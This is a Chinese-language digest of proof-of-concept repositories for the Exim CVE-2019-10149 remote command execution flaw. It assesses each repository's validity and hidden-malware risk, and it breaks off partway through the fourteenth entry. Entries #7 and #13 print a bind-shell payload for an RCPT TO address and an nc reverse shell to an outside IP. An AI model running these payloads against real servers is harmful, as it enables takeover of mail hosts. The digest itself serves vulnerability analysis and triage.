# CVE-2019-10149

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md](../2019/CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在4.87到4.91之间，需要网络访问25端口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理 (MTA) 的 deliver_message() 函数中，由于对接收者地址验证不当导致。攻击者可以通过发送特制的电子邮件，在目标服务器上执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的利用是有效的。POC代码 `wizard.py` 模拟了SMTP交互，利用`RCPT TO`命令中的`${run{...}}` 扩展功能，执行shell命令。

**投毒风险分析：**

检查提供的`wizard.py`文件，其中的payload经过了编码，目的是为了绕过一些检测机制。解码后的命令主要完成以下操作：

*   创建一个具有SUID权限的程序 `s`。
*   该程序 `s` 拥有root权限，执行后会启动一个root shell。
*   利用`${run{}}` 在服务器上执行编译命令，生成二进制文件s，并赋予SUID权限
*   POC的最后，执行该程序 `/tmp/s` 以获取root权限。

该POC旨在提升权限，而不是注入恶意代码到服务器的持久性位置，因此不属于传统的“投毒”行为。 投毒风险：0%

**利用方式：**

1.  攻击者连接到Exim服务器的25端口。
2.  发送HELO, MAIL FROM等SMTP命令进行初始化。
3.  利用 `RCPT TO` 命令，构造包含恶意命令的接收者地址，其中使用了 `${run{...}}` 扩展功能。
4.  发送DATA命令，提供邮件内容 (实际上邮件内容对利用该漏洞来说并不重要)。
5.  利用服务器执行`${run{}}`中的命令，该命令编译一个具有SUID的程序，攻击者执行该程序以获取root权限。

**项目地址:** [AzizMea/CVE-2019-10149-privilege-escalation](https://github.com/AzizMea/CVE-2019-10149-privilege-escalation)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #2

**来源**: [CVE-2019-10149-Brets0150_StickyExim.md](../2019/CVE-2019-10149-Brets0150_StickyExim.md)

## CVE-2019-10149 Exim RCE HoneyPot

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务运行且存在漏洞版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 4.87 到 4.91 版本中存在的一个远程代码执行漏洞。该漏洞源于 `deliver_message()` 函数中对接收者地址的不当验证，攻击者可以通过构造包含恶意命令的电子邮件，利用此漏洞在目标系统上执行任意代码。

**有效性评估：**

根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、被广泛讨论的严重漏洞，并且已经被实际利用。提供的漏洞利用代码实际上是一个蜜罐脚本，用于检测针对此漏洞的攻击尝试，而不是一个直接利用漏洞的 PoC。然而，README中提到了另一个PoC：`https://github.com/cowbe0x004/eximrce-CVE-2019-10149`， 可以验证漏洞。

**投毒风险评估：**

该仓库主要功能是做一个蜜罐，用于监控Exim漏洞(CVE-2019-10149)的攻击行为。

*   `install_StickyExim.sh`: 安装和配置蜜罐，包括Exim配置和Cron Job设置
*   `honey_harvester_exim_cve-2019-10149.sh`: 核心脚本，用于解析Exim日志，检测CVE-2019-10149攻击尝试，并发送告警邮件。

审查了安装脚本和核心检测脚本。发现主要功能是监控和告警，没有发现明显的恶意代码，考虑到代码会修改Exim配置以及加入Cron Job。存在一定的风险，但是风险较低。所以判断存在10%的投毒风险。

**利用方式分析：**

此PoC本身不是用于攻击的，而是用于创建一个蜜罐来捕获攻击流量。 但是根据漏洞描述，利用方式大致如下：

1.  攻击者构造一封特殊的电子邮件，该邮件的接收者地址包含恶意命令。
2.  当 Exim 处理这封邮件时，`deliver_message()` 函数未能正确验证接收者地址，导致恶意命令被执行。
3.  攻击者可以通过这种方式在服务器上执行任意代码，从而控制服务器。

**总结：**

该漏洞是一个严重的安全漏洞，可以允许未经身份验证的远程攻击者在受影响的 Exim 服务器上执行任意代码。需要尽快修补此漏洞。

**项目地址:** [Brets0150/StickyExim](https://github.com/Brets0150/StickyExim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #3

**来源**: [CVE-2019-10149-Chris-dev1_exim.exp.md](../2019/CVE-2019-10149-Chris-dev1_exim.exp.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致完全控制受影响的服务器

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响的Exim版本，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中。这是一个远程命令执行漏洞，由于 `deliver_message()` 函数中对接收者地址的验证不当，导致攻击者可以通过发送特制的电子邮件来执行任意命令。漏洞利用方式通常涉及构造包含恶意命令的电子邮件地址，这些命令会在 Exim 处理邮件时被执行。从搜索结果和漏洞库信息来看，此漏洞已被广泛利用。提供的代码片段仅为Apache License 2.0协议，不包含任何漏洞利用或恶意代码。因此，可以判断投毒风险为0%。根据搜索结果，漏洞利用代码已经公开。

**项目地址:** [Chris-dev1/exim.exp](https://github.com/Chris-dev1/exim.exp)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #4

**来源**: [CVE-2019-10149-Diefunction_CVE-2019-10149.md](../2019/CVE-2019-10149-Diefunction_CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标服务器运行存在漏洞的Exim版本，且允许外部连接到SMTP端口（默认25端口）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。漏洞原因是Exim在`deliver_message()`函数中对收件人地址的验证不当，攻击者可以通过构造特殊的邮件收件人地址，在服务器上执行任意命令。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞是真实存在的，且有可用的POC代码。搜索引擎结果中多个链接（例如Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire, RedHat）都确认了此漏洞的存在和高危性。CISA已将此漏洞加入已知被利用的漏洞目录(KEV)。提供的PoC脚本也证实了利用方法的可行性。

**投毒风险：**
分析提供的`exploit.py`代码，该脚本主要功能是利用SMTP协议与目标Exim服务器进行交互，构造包含恶意命令的收件人地址，从而实现远程命令执行。脚本的主要步骤包括：
1.  建立socket连接到目标服务器的25端口
2.  发送EHLO命令
3.  发送MAIL FROM命令
4.  发送RCPT TO命令，其中收件人地址包含`${run{...}}`结构，用于执行命令
5.  发送DATA命令
6.  发送包含一系列Received头的邮件正文，最后以".\r\n"结束

检查脚本代码，没有发现任何可疑的、与漏洞利用无关的代码。payload部分通过字符串格式化，将反弹shell命令注入到收件人地址中。因此，可以认为此仓库中作者隐藏投毒代码的可能性为0%。

**利用方式：**
1.  **前期准备：** 攻击者需要一台可以访问目标服务器的机器，并且需要知道目标服务器的IP地址和SMTP端口（通常是25）。攻击者还需要监听一个端口，用于接收目标服务器反弹的shell。
2.  **漏洞利用：** 攻击者运行提供的`exploit.py`脚本，指定目标服务器的IP地址、SMTP端口、攻击者自己的IP地址和监听端口。
3.  **远程命令执行：** 脚本会构造一个包含恶意命令的邮件，发送给目标服务器。当Exim处理该邮件时，会执行恶意命令，通常是反弹shell。
4.  **获取shell：** 攻击者在自己的机器上接收到反弹的shell，从而控制目标服务器。

**项目地址:** [Diefunction/CVE-2019-10149](https://github.com/Diefunction/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #5

**来源**: [CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md](../2019/CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行，完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标Exim服务器监听25端口，并且存在漏洞版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于Exim的 deliver_message() 函数中，由于对接收者地址验证不当，可能导致远程命令执行。攻击者可以通过构造特殊的邮件，在接收者地址中注入恶意命令，从而在目标服务器上执行任意代码。

**有效性评估：**
根据漏洞库信息和搜索结果，CVE-2019-10149 是一个已被确认的、高危的远程命令执行漏洞。多个安全厂商和研究人员已经发布了相关的分析和PoC代码。

**投毒风险评估：**
提供的PoC代码只有一个README.md文件，内容是关于漏洞的SNP分配，本身不包含任何可执行的代码，因此直接投毒的概率较低。但是，PoC代码仓库可能包含其他未列出的恶意文件或依赖项，所以仍然存在一定的投毒风险。根据目前的信息，投毒风险估计为10%。更完善的分析需要检查所有文件和依赖。

**利用方式：**
1.  攻击者向目标 Exim 服务器发送一封特制的电子邮件。
2.  该邮件的接收者地址中包含恶意构造的命令注入代码。
3.  当 Exim 处理该邮件时，由于 deliver_message() 函数的验证缺陷，恶意命令会被执行。
4.  攻击者从而获得目标服务器的远程代码执行权限，可以执行任意操作，如安装后门、窃取数据等。

**排序优先级说明：** 遵循 搜索引擎结果 > 漏洞利用代码 > 漏洞库信息 原则。


**项目地址:** [Dilshan-Eranda/CVE-2019-10149](https://github.com/Dilshan-Eranda/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #6

**来源**: [CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md](../2019/CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制受影响的服务器

**影响版本:** 4.87 - 4.91

**利用条件:** 需要 Exim 服务在目标机器上运行，且版本在受影响范围内，可能需要目标服务器开放25端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 邮件服务器中存在的远程命令执行漏洞。该漏洞是由于 `deliver_message()` 函数中对收件人地址的不正确验证引起的。攻击者可以通过发送特制的电子邮件利用此漏洞，从而在服务器上以 root 权限执行任意命令。

**有效性评估：**

提供的 PoC 代码 `PoC_CVE-2019-10149.py` 看起来有效。它通过 SMTP 协议与 Exim 服务器建立连接，并发送包含恶意命令的电子邮件。该命令嵌入在收件人地址中，利用了 Exim 的字符串扩展功能来执行命令。

多个来源（Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire）确认了该漏洞的存在和严重性，并指出该漏洞已被积极利用。

**投毒风险评估：**

该 PoC 代码本身相对简单，主要功能是利用漏洞执行命令。投毒的潜在风险较低，但并非完全没有。

*   **编码风险：** 代码中包含hex编码，降低了代码可读性，可能存在隐藏代码，如果hex编码混淆了正常的指令与后门代码，存在一定的风险。
*   **依赖风险：** 该脚本依赖Python3和socket，确保环境安全。
*   **维护者风险：**虽然README.md声明免责声明，但依旧存在风险，需要保持警惕。

综合考虑，该仓库的投毒风险评估在10%。

**利用方式分析：**

1.  **目标确认：** 确认目标系统运行着受影响版本的 Exim（4.87 到 4.91）。
2.  **SMTP 连接：** 使用 PoC 脚本通过 SMTP 协议连接到目标 Exim 服务器的 25 端口（或其他配置的端口）。
3.  **构造恶意邮件：** PoC 脚本构造一封包含恶意收件人地址的电子邮件。该地址利用 Exim 的字符串扩展功能来执行命令。
4.  **发送邮件：** 将构造的邮件发送到目标 Exim 服务器。
5.  **命令执行：** 如果漏洞利用成功，Exim 将以 root 权限执行嵌入在收件人地址中的命令。

**缓解措施：**

*   升级 Exim 到受影响版本之外的版本(>=4.92)。
*   禁用 Exim 的字符串扩展功能（如果可能）。
*   使用防火墙限制对 Exim 端口的访问。

**项目地址:** [MNEMO-CERT/PoC--CVE-2019-10149_Exim](https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #7

**来源**: [CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md](../2019/CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** 4.87-4.91

**利用条件:** 目标系统运行受影响版本的Exim，且允许从攻击者主机到目标机器25端口的TCP连接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim 4.87到4.91版本中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以利用此漏洞，通过构造包含恶意命令的特殊邮件，在目标系统上执行任意代码，从而完全控制系统。

**有效性分析：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，可以确认此漏洞是真实存在的，并且PoC代码可以有效利用此漏洞。

**投毒风险分析：**
PoC代码通过`nc`在目标机器上反弹shell，监听31415端口。代码本身目的是利用漏洞，没有发现隐藏的恶意代码或后门，因此投毒风险较低，为0%。

**漏洞利用方式：**
1.  PoC首先通过`nc`连接到目标Exim服务器的25端口（SMTP）。
2.  发送`HELO`命令，声明客户端主机名。
3.  发送`MAIL FROM`命令，指定发件人地址。
4.  发送`RCPT TO`命令，指定收件人地址，其中收件人地址包含恶意的payload：`${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31415\t-e\t\x2fbin\x2fsh\x22}}@localhost`。
    *   这个payload使用了Exim的`${run{}}`扩展函数，可以在Exim进程中执行任意命令。
    *   payload的功能是执行`nc -lp 31415 -e /bin/sh`，即在目标机器上监听31415端口，并将/bin/sh绑定到该端口，相当于反弹了一个shell。
5.  发送`DATA`命令，开始邮件内容传输。
6.  发送一系列`Received:`头，用于填充邮件内容并触发漏洞（原因在于Exim对过长的头部处理可能存在问题，也可能是为了绕过某些过滤）。
7.  发送`.
`表示邮件内容结束。
8.  发送`QUIT`命令断开连接。
9.  PoC最后使用`nc localhost 31415`连接到目标机器上反弹的shell，实现远程代码执行。

**项目地址:** [Stick-U235/CVE-2019-10149-Exploit](https://github.com/Stick-U235/CVE-2019-10149-Exploit)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #8

**来源**: [CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md](../2019/CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务对外开放SMTP端口(默认25)

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以通过构造包含恶意代码的特殊收件人地址，利用`run{}`扩展函数执行任意命令。该漏洞的利用方式主要通过SMTP协议发送特制的邮件，在`RCPT TO`指令中注入恶意payload。PoC代码构造了包含payload的收件人地址，利用`${run{}}`语法执行命令。考虑到PoC作者公开了他的代码，并且投毒代码的收益比直接攻击低，因此投毒概率较低，但是仍存在一定风险。

**项目地址:** [VoyagerOnne/Exim-CVE-2019-10149](https://github.com/VoyagerOnne/Exim-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #9

**来源**: [CVE-2019-10149-aishee_CVE-2019-10149-quick.md](../2019/CVE-2019-10149-aishee_CVE-2019-10149-quick.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标系统运行存在漏洞版本的 Exim，且攻击者能够发送邮件到目标服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当导致远程命令执行。攻击者可以通过构造特殊的邮件，在收件人地址中注入恶意命令，当 Exim 处理该邮件时，这些命令会被执行，从而控制服务器。

**有效性:**
根据搜索引擎结果，该漏洞已被广泛证实存在，并且有公开的 PoC 利用代码。漏洞库信息也确认了该漏洞的存在。

**投毒风险:**
提供的 PoC 代码包含一个 Bash 脚本，用于检测目标操作系统并尝试更新 Exim 和 Curl 软件包。这个脚本本身看起来像是尝试修复漏洞，而非利用它。`README.md` 文件也描述脚本为快速修复程序。虽然脚本尝试更新软件包，但如果服务器配置不当，或者更新源被恶意篡改，也存在一定的风险。此外，`apt-get --yes --force-yes install`和 `yum install -y -q -e 0` 在没有充分验证更新源的情况下，可能安装恶意的软件包。因此，存在极小的潜在投毒风险，约为 1%。

**利用方式:**
1.  攻击者需要确定目标服务器运行的是 Exim 4.87 到 4.91 之间的易受攻击版本。
2.  攻击者构造一封包含恶意命令的电子邮件。该命令被嵌入到收件人地址中，利用了 `deliver_message()` 函数的漏洞。
3.  攻击者将构造的邮件发送到目标服务器。
4.  当 Exim 处理该邮件时，会执行嵌入在收件人地址中的恶意命令，从而导致远程代码执行。攻击者可以使用此漏洞来安装后门、窃取敏感信息或执行其他恶意操作。

**项目地址:** [aishee/CVE-2019-10149-quick](https://github.com/aishee/CVE-2019-10149-quick)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #10

**来源**: [CVE-2019-10149-bananaphones_exim-rce-quickfix.md](../2019/CVE-2019-10149-bananaphones_exim-rce-quickfix.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响版本的Exim，且漏洞未被修复

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，是由于 `deliver_message()` 函数中对接收者地址验证不当造成的远程命令执行漏洞。攻击者可以通过构造特殊的邮件，利用该漏洞在目标服务器上执行任意命令。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞的POC代码是有效的。搜索引擎结果显示该漏洞已被广泛利用，并且有活跃的Linux蠕虫利用此漏洞传播。漏洞利用代码中的 `exim_rce_fixer.sh` 脚本尝试更新 Exim 并移除恶意软件，表明存在利用该漏洞植入的恶意程序。

**投毒风险分析：**
提供的脚本 `exim_rce_fixer.sh` 旨在修复漏洞并清理恶意软件，但它本身可能存在投毒风险。脚本尝试删除与 `tor2web` 相关的恶意软件，更新 Exim，并删除可疑的 cron 任务和 authorized_keys 条目。但是，如果脚本未能完全清除恶意软件，或者脚本本身包含恶意代码，则可能导致系统受损。此外，脚本强制重启服务器，这可能导致数据丢失或服务中断。

`malware_do_not_run.sh` 脚本明确包含连接到 Tor 网络的行为，并尝试下载和执行恶意代码。尽管文件名暗示不要运行，但攻击者可以通过该脚本植入恶意软件。

综合考虑，脚本中清理恶意软件的部分看起来是合法的，但 `malware_do_not_run.sh` 脚本和`exim_rce_fixer.sh`脚本潜在的清理不完全和强制重启行为构成了投毒风险。

**利用方式：**
1.  攻击者构造包含恶意命令的特殊邮件。
2.  Exim 在处理邮件时，由于对接收者地址验证不当，将恶意命令传递给系统 shell 执行。
3.  攻击者从而在目标服务器上获得远程代码执行权限。
4.  攻击者可能利用该权限安装恶意软件，窃取数据，或控制服务器。

**项目地址:** [bananaphones/exim-rce-quickfix](https://github.com/bananaphones/exim-rce-quickfix)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #11

**来源**: [CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md](../2019/CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行存在漏洞的Exim版本，并且攻击者可以向Exim服务器发送邮件。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理（MTA）的 deliver_message() 函数中，由于对收件人地址的验证不当导致。未经身份验证的远程攻击者可以通过向目标服务器发送特制的邮件来利用此漏洞，从而在目标系统上执行任意命令。漏洞利用通常涉及在邮件收件人地址中注入 shell 命令。 

根据提供的漏洞利用代码，`/tmp/b373ced1c77bc05f74b9541e06f0010c/README.md`文件主要包含关于CVE-2019-10149、CVE-2019-15846 和 CVE-2019-16928漏洞的相关信息收集，包括漏洞公告、漏洞利用详情、问题时间线、NSA公告以及受影响的IP、ASN、国家和主机名等数据链接。其中`election-domains-by-expiration-date.txt`文件是域名列表, 不太可能直接用于漏洞利用，但是可能被用于信息收集或后续攻击。

**有效性：** 根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在公开的漏洞利用代码，因此可以判断提供的漏洞利用代码是有效的。

**投毒风险：** 该仓库中存在的投毒代码可能性较低，主要是因为其内容以漏洞信息搜集为主，提供的数据源链接也是公开信息。`election-domains-by-expiration-date.txt`可能存在搜集来的恶意域名，但作者进行恶意添加的可能性较低。

**利用方式：** 攻击者构造包含恶意命令的邮件，利用Exim在处理收件人地址时的验证缺陷，将命令注入到系统执行。这通常通过在收件人地址中嵌入反引号或者其他命令执行符号来实现。该漏洞允许攻击者远程执行代码而无需身份验证。

**项目地址:** [cloudflare/exim-cve-2019-10149-data](https://github.com/cloudflare/exim-cve-2019-10149-data)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #12

**来源**: [CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md](../2019/CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程命令执行和系统被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** Exim服务对外开放，攻击者能够发送恶意构造的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，由于 `deliver_message()` 函数对接收者地址验证不当，攻击者可以通过发送特制的邮件，在目标服务器上执行任意命令。从提供的漏洞利用代码来看，利用方式主要有两种：

1.  **本地检测脚本 (eximioc.sh):**  此脚本用于在目标服务器本地运行，检测是否存在漏洞利用的迹象，例如检查Exim版本、cPanel版本以及是否存在异常进程 `kthrotlds`。

2.  **远程利用脚本 (eximrce.py):**  此脚本用于远程触发漏洞。它通过socket连接到目标服务器的Exim服务端口，发送包含恶意payload的邮件。Payload利用 `${run{...}}` 结构在服务器上执行命令，例如创建一个文件 `/root/lweximtest`。如果文件创建成功，则表明服务器存在远程命令执行漏洞。

**漏洞利用方式总结:**

*   攻击者构造包含恶意recipient地址的邮件。
*   邮件被发送到运行存在漏洞的Exim服务器。
*   Exim服务器在处理邮件时，由于recipient地址验证不当，执行了恶意payload中的命令。
*   攻击者在服务器上执行任意命令。

**投毒风险分析:**

提供的 `eximrce.py` 代码本身功能明确，旨在测试是否存在 CVE-2019-10149 漏洞。`eximioc.sh` 的目标也是检测漏洞和受攻击迹象。 但是依然存在以下风险，风险值给到10%。

*   **作者风险：** 从GitHub仓库直接下载并运行代码，存在一定的作者恶意投毒风险。例如，作者可能在脚本中添加隐藏的后门代码，在漏洞利用的同时，植入恶意程序。
*   **依赖风险：** `eximioc.sh` 脚本依赖 `expect` 和 `openssl` 命令。如果系统上安装的 `expect` 或 `openssl` 被篡改，则可能引入新的安全风险。
*   **维护风险：** 仓库如果长时间没有更新和维护，可能会被其他人恶意篡改，引入恶意代码。
*   **测试文件的影响:**虽然 `eximrce.py` 仅仅touch了一个文件,但是如果被滥用，将可能导致拒绝服务攻击。

**项目地址:** [cowbe0x004/eximrce-CVE-2019-10149](https://github.com/cowbe0x004/eximrce-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #13

**来源**: [CVE-2019-10149-darsigovrustam_CVE-2019-10149.md](../2019/CVE-2019-10149-darsigovrustam_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() 远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在漏洞影响范围内，允许外部连接到25端口(SMTP)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 漏洞存在于 Exim 邮件传输代理 (MTA) 的 `deliver_message()` 函数中，由于未正确验证收件人地址，攻击者可以通过构造特殊的电子邮件，在目标系统上执行任意命令。根据搜索结果，该漏洞已经被积极利用。提供的POC代码描述了如何利用该漏洞，包括安装易受攻击的Exim版本、配置、构造 payload 以及发送利用请求。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该POC代码是有效的。搜索结果表明该漏洞已被广泛利用，POC代码也提供了详细的利用步骤。POC代码中的安装步骤确保了在特定环境下漏洞的可复现性。

**投毒风险评估：**

初步分析POC代码仓库，`/tmp/a0abe20df178383d8f8296dfca6f85dc/RemoteConnection.sh` 脚本存在一定的投毒风险。该脚本使用 `tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 192.168.0.165 444 1> /tmp/1` 建立反向连接，这意味着攻击者（或脚本控制者）可以通过 `nc` 连接到受害者机器，并在受害者机器上执行命令。虽然脚本中明确提示需要修改IP和端口，但如果用户不修改就直接运行，将会连接到脚本作者控制的服务器。这种行为虽然不是传统意义上的恶意代码注入，但具有潜在的远程控制风险。

除此之外, `RemoteConnection.sh` 使用 `/tmp/1` 作为管道文件进行输入输出重定向,这可能导致数据泄露或覆盖。

因此，综合评估，投毒风险约为10%。大部分代码是用于漏洞利用，但反向连接部分存在被恶意利用的可能，用户需要仔细审查并修改脚本。

**利用方式分析：**

1.  **安装漏洞版本 Exim:**  首先，需要安装一个存在漏洞的 Exim 版本 (4.87 - 4.91)。
2.  **配置 Exim:**  为了方便利用，需要修改 Exim 的配置，允许 relaying，避免等待时间限制，并取消 recipient 验证。
3.  **构造 Payload:**  将要执行的 shell 命令转换为十六进制字符串，并将其嵌入到收件人地址中。Payload 的格式为 `<${run{<hex_encoded_command>}}@localhost>`。
4.  **发送恶意邮件：**
    *   使用 `nc` 连接到 Exim 服务器的 25 端口。
    *   发送 `HELO` 命令。
    *   设置发件人地址为 `<>`。
    *   设置收件人地址为构造好的 payload。
    *   发送 `DATA` 命令，并发送 31 行任意内容、一个空行和一个句点 (`.`) 来结束邮件内容。
5.  **执行命令：** Exim 在处理邮件时，会执行嵌入在收件人地址中的 shell 命令。

**项目地址:** [darsigovrustam/CVE-2019-10149](https://github.com/darsigovrustam/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #14

**来源**: [CVE-2019-10149-hyim0810_CVE-2019-10149.md](../2019/CVE-2019-10149-hyim0810_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行和系统完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行受影响版本的Exim，且攻击者能够通过网络连接到SMTP端口（通常是25端口）。配置不当，如允许任意relay，会降低利用难度。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149是Exim邮件传输代理（MTA）中的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对接收者地址的不正确验证。攻击者可以通过构造包含恶意命令的特殊邮件，利用该漏洞在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞信息、搜索结果和提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个已知的、被广泛讨论和利用的漏洞。漏洞利用代码提供了详细的利用步骤，包括：

1.  安装受影响版本的Exim（4.87-4.91）。
2.  修改Exim配置以允许relay（简化利用，否则需要等待7天）。
3.  使用netcat (nc) 连接到目标Exim服务器的25端口。
4.  通过SMTP协议发送特制的邮件，其中接收者地址包含要执行的命令（hex编码）。
5.  发送DATA命令和后续数据，触发漏洞。

**投毒风险分析：**

